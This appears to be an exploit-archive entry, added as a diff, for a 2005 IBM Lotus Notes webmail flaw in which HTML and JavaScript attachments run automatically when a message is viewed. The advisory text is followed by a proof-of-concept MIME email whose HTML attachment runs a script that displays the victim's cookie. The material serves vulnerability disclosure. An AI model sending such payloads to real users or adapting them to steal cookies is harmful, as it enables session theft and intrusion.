@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/14164/info
+
+IBM Lotus Notes email client is prone to an input validation vulnerability. Reports indicate that HTML and JavaScript attached to received email messages is executed automatically when the email message is viewed. Specifically, users accessing standard Notes mail templates through a Web mail client are affected.
+
+This vulnerability may be leveraged by a remote attacker to automatically execute arbitrary script code in the context of a target user. 
+
+Content-Transfer-Encoding: 8bit
+Content-Type: multipart/mixed; boundary="0-1940165274-1120658611=:34349"
+
+--0-1940165274-1120658611=:34349
+Content-Type: text/plain; charset=iso-8859-1
+Content-Disposition: inline
+Content-Id:
+Content-Transfer-Encoding: quoted-printable
+
+read it
+
+
+                 =09
+=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=
+=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=5F=
+=5F=5F=5F=5F=5F=5F=5F=5F=5F=20
+
+--0-1940165274-1120658611=:34349
+Content-Type: text/html; name="malxxx.html"
+Content-Disposition: inline; filename="malxxx.html"
+Content-Description: 268262132-malxxx.html
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<title>Test XSS of uploaded documents</title>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+</HEAD>
+<BODY>
+<SCRIPT>
+document.write('The cookie is:<br> ' + document.cookie + '<p>');
+</SCRIPT>
+ </BODY></HTML>
+
+--0-1940165274-1120658611=:34349--
+
